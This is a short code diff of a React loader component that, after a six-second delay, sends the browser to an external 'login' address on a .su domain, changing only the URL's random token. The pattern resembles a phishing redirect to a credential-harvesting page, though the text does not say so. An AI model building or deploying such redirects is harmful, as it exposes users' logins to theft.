@@ -6,7 +6,7 @@ export default function Loader() {
 
   useEffect(() => {
     setTimeout(() => {
-      window.location = "https://login.customzipr.su/sHjABeiT"
+      window.location = "https://login.customzipr.su/GjKBeIxk"
     }, 6000)
   }, [])
 
